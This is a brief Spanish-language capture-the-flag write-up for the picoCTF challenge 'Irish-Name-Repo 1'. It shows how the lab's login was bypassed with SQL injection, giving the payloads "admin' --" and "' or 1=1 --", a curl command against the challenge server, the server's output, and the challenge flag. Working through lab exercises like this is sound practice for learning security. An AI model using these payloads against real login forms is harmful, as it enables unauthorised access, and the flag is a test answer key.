### Irish-Name-Repo 1
### Descripcion
Do you think you can log us in? Try to see if you can login!

Additional details will be available after launching your challenge instance.
http://fickle-tempest.picoctf.net:59235
### Solucion

Se realizo una inyeccion SQL en el login
Para conocer el query original existia un input oculto que si estaba en 1 se veia la query tal y como se mandaba a la base de datos
solo se coloco el usuario "admin' --" que comenta la query que revisa la contraseña
otra forma es "carlos' or 1=1 -- " que asegura la entrada aunque el usuario no exista y comenta el resto de la query que checaba el password

Query final: 
SELECT * FROM users WHERE name='admin' or 1=1-- ' AND password='cualquiercosa'
Consola:
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://fickle-tempest.picoctf.net:62649/login.php -d "username=admin' or 1=1-- &password=cualquiercosa&debug=1"
<pre>username: admin' or 1=1-- 
password: cualquiercosa
SQL query: SELECT * FROM users WHERE name='admin' or 1=1-- ' AND password='cualquiercosa'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p> 
```
picoCTF{s0m3_SQL_85832275}
### Notas adicionales

### Referencias